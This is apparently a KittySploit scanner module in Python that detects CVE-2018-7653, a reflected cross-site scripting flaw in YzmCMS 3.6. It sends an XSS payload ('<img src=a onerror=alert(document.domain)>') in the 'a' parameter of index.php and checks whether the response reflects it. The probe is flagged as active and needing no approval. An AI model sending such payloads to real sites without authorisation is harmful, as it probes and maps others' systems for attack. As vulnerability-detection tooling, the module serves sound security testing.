#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In YzmCMS 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'YzmCMS v3.6 - Cross-Site Scripting Detection',
        'description': 'In YzmCMS 3.6, index.php has XSS via the a, c, or m parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'packetstorm', 'yzmcms', 'cms', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/147065/YzmCMS-3.6-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-7653',
            'https://github.com/ponyma233/YzmCMS/blob/master/YzmCMS_3.6_bug.md',
            'https://github.com/anquanquantao/iwantacve',
            'https://github.com/5ecurity/CVE-List',
        ],
        'cve': 'CVE-2018-7653',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?m=search&c=index&a=initxqb4n<img%20src%3da%20onerror%3dalert(document.domain)>cu9rs&modelid=1&q=tes', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        body_all = ('<img src=a onerror=alert(document.domain)>', 'yzmcms',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="YzmCMS v3.6 - Cross-Site Scripting detected",
                path='/index.php?m=search&c=index&a=initxqb4n<img%20src%3da%20onerror%3dalert(document.domain)>cu9rs&modelid=1&q=tes',
            )
            return True
        return False

